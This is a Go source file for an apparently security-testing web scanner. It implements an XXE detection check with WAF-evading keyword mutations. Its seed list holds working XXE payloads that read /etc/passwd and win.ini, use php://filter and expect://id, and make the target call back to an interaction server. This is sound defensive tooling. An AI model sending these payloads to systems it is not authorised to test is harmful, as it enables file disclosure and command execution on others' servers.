package active

import (
	"context"
	"fmt"
	"strings"
	"time"

	"github.com/guaidao2/crackweb/internal/checks"
	"github.com/guaidao2/crackweb/internal/finding"
	"github.com/guaidao2/crackweb/internal/httpmsg"
	"github.com/guaidao2/crackweb/internal/i18n"
	"github.com/guaidao2/crackweb/internal/payload"
)

// xxeSeeds are complete XML documents that declare an external entity.
//
// They are complete documents rather than fragments because the injection point
// for XXE is the body itself: a parser reads a whole document, so a check that
// inserted an entity into a value would be testing something else.
//
// Two families are needed and they catch different things. The callback forms
// prove that entity resolution happens at all, even when nothing is echoed back —
// that is the blind case, and it is the common one. The file forms prove it by
// reading a file whose contents are unmistakable.
var xxeSeeds = []string{
	`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "` + checks.CallbackURL + `">]><root>&xxe;</root>`,
	`<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [<!ENTITY % xxe SYSTEM "` + checks.CallbackURL + `">%xxe;]><root/>`,
	`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`,
	`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>`,
	`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><root>&xxe;</root>`,
	`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "expect://id">]><root>&xxe;</root>`,
}

// xxeFileSignatures are the contents of the files the file-based seeds read.
var xxeFileSignatures = []string{
	"root:x:0:0",
	"daemon:x:1:1",
	"[boot loader]",
	"for 16-bit app support",
	"cm9vd" + ":x:0:0", // base64 of root:x:0:0, for the php://filter form
}

// xxe detects XML external entity injection.
//
// It is request-level: the body is the payload, so there is no parameter to
// mutate. Mutation still applies, but to the document's keywords rather than to
// a value — XML spells its doctype keywords the same way every parser expects,
// and a filter that matches them literally is the thing being walked past.
type xxe struct{}

func (xxe) ID() string                 { return "xxe" }
func (xxe) TitleKey() i18n.Key         { return i18n.KeyCheckXXETitle }
func (xxe) DescriptionKey() i18n.Key   { return i18n.KeyCheckXXEDesc }
func (xxe) RemediationKey() i18n.Key   { return i18n.KeyCheckXXEFix }
func (xxe) Severity() finding.Severity { return finding.SeverityHigh }
func (xxe) Tags() []string {
	return []string{"active", "injection", "xxe", "owasp-top10"}
}
func (xxe) Passive() bool { return false }

// IsRequestLevel marks this as a check that replaces the request body.
func (xxe) IsRequestLevel() bool { return true }

func (xxe) Run(ctx context.Context, c *checks.Context, t *checks.Target) []*finding.Finding {
	if t == nil || t.Request == nil || t.Response == nil {
		return nil
	}
	if !acceptsXML(t.Request) {
		return nil
	}

	host := t.Request.Hostname()
	// One probe for the whole host: the answer does not depend on the body.
	c.ProbeWAF(ctx, &checks.Target{Request: t.Request, Response: t.Response})

	var (
		pending []xxeAttempt
		blocked bool
	)

	for _, seed := range xxeSeeds {
		for _, variant := range xxeVariants(seed) {
			mutated, response, token, err := sendXXE(ctx, c, t, variant)
			if err != nil || mutated == nil || response == nil {
				continue
			}
			if c.WAF.IsBlocked(host, response) {
				blocked = true
				continue
			}

			// A file read is conclusive on its own.
			if signature := firstNewSignature(strings.ToLower(string(response.Body)),
				strings.ToLower(string(t.Response.Body)), xxeFileSignatures); signature != "" {
				return []*finding.Finding{xxeFinding(c, t, mutated, response, variant, signature)}
			}
			if token != "" {
				pending = append(pending, xxeAttempt{token: token, request: mutated, response: response, variant: variant})
			}
		}
	}

	// Blind XXE is the common case: nothing is echoed, and the only proof is the
	// callback the parser makes on its own.
	if found, interactions := awaitXXECallbacks(ctx, c, pending); found != nil {
		f := xxeFinding(c, t, found.request, found.response, found.variant,
			c.Bundle.T(i18n.KeyEvidenceOOB, found.callback, interactions, ""))
		return []*finding.Finding{f}
	}

	_ = blocked
	return nil
}

// xxeAttempt is a sent payload whose proof may still be in flight.
type xxeAttempt struct {
	token    string
	request  *httpmsg.Request
	response *httpmsg.Response
	variant  payload.Variant
	// callback is the URL that was planted, for the report.
	callback string
}

// xxeVariants returns a seed and the keyword rewrites that survive a filter.
func xxeVariants(seed string) []payload.Variant {
	out := []payload.Variant{{Value: seed, Generation: 0}}
	for _, mutator := range payload.MutatorsFor(payload.XXE) {
		if value := mutator.Apply(seed); value != seed {
			out = append(out, payload.Variant{
				Value:      value,
				Generation: 1,
				Mutators:   []string{mutator.Name},
			})
		}
	}
	return out
}

// sendXXE replaces the request body with an XML document and sends it.
//
// It is a free function rather than a method: the context belongs to another
// package, and a check has no business adding behaviour to it.
func sendXXE(ctx context.Context, c *checks.Context, t *checks.Target, variant payload.Variant) (*httpmsg.Request, *httpmsg.Response, string, error) {
	body := variant.Value
	token := ""
	if c.OOB != nil {
		callbackURL, minted := c.OOB.NewURL("xxe")
		token = minted
		body = strings.ReplaceAll(body, checks.CallbackURL, callbackURL)
	} else if strings.Contains(body, checks.CallbackURL) {
		// Without an interaction server the callback seeds cannot prove
		// anything, so they are not sent.
		return nil, nil, "", nil
	}

	mutated := t.Request.Clone()
	mutated.Body = []byte(body)
	mutated.Header.Set("Content-Type", "application/xml")
	mutated.Header.Set("Content-Length", fmt.Sprint(len(body)))
	mutated.Origin = httpmsg.OriginReplay

	response, err := c.Do(ctx, mutated)
	if err != nil {
		return nil, nil, "", err
	}
	return mutated, response, token, nil
}

// awaitXXECallbacks waits for a parser to reach out.
func awaitXXECallbacks(ctx context.Context, c *checks.Context, pending []xxeAttempt) (*xxeAttempt, string) {
	if len(pending) == 0 || c.OOB == nil {
		return nil, ""
	}
	wait := c.OOBWait
	if wait <= 0 {
		wait = checks.OOBWait
	}
	deadline := time.Now().Add(wait)
	for {
		for i := range pending {
			if interactions := c.OOB.Poll(pending[i].token); len(interactions) > 0 {
				detail := interactions[0].Detail
				return &pending[i], detail
			}
		}
		if time.Now().After(deadline) {
			return nil, ""
		}
		select {
		case <-time.After(250 * time.Millisecond):
		case <-ctx.Done():
			return nil, ""
		}
	}
}

// acceptsXML reports whether a request looks like it carries an XML document.
func acceptsXML(req *httpmsg.Request) bool {
	contentType := req.Header.Get("Content-Type")
	if strings.Contains(contentType, "xml") {
		return true
	}
	// Plenty of uploads arrive as octet-stream and are sniffed by the server.
	lower := strings.ToLower(contentType)
	if strings.Contains(lower, "octet-stream") || contentType == "" {
		trimmed := strings.TrimSpace(string(req.Body))
		return strings.HasPrefix(trimmed, "<?xml") || strings.HasPrefix(trimmed, "<svg") ||
			strings.HasPrefix(trimmed, "<!DOCTYPE")
	}
	return false
}

// xxeFinding builds an XXE finding.
func xxeFinding(c *checks.Context, t *checks.Target, req *httpmsg.Request, resp *httpmsg.Response, variant payload.Variant, evidence string) *finding.Finding {
	f := checks.NewFinding(xxe{}, t,
		i18n.KeyCheckXXETitle, i18n.KeyCheckXXEDesc, i18n.KeyCheckXXEFix)
	f.Severity = finding.SeverityHigh
	f.Confidence = finding.ConfidenceCertain
	f.Method = req.Method
	f.URL = req.URLString()
	f.Payload = variant.Value
	f.CWE = "CWE-611"
	f.References = []string{
		"https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing",
		"https://cwe.mitre.org/data/definitions/611.html",
	}
	f.Evidence.Request = req.Raw()
	f.Evidence.Response = truncate(resp.Body, 8192)
	f.Evidence.Baseline = truncate(t.Response.Body, 4096)
	f.Evidence.Matches = []string{evidence}
	if variant.Generation > 0 {
		f.Evidence.Matches = append(f.Evidence.Matches,
			"payload variant: "+variant.Label())
	}
	return f
}
